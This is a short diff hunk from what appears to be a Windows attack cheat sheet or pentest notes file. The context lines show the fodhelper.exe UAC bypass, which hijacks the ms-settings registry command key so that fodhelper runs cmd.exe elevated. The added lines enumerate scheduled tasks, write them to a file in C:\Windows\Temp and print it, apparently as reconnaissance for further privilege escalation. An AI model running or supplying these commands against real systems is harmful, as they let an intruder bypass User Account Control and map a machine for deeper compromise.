@@ -273,3 +273,6 @@ reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd.exe /c 
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
 
 fodhelper.exe
+schtasks /query /fo LIST /v
+cmd /c "schtasks /query /fo LIST /v > C:\Windows\Temp\tasks.txt 2>&1"
+type C:\Windows\Temp\tasks.txt
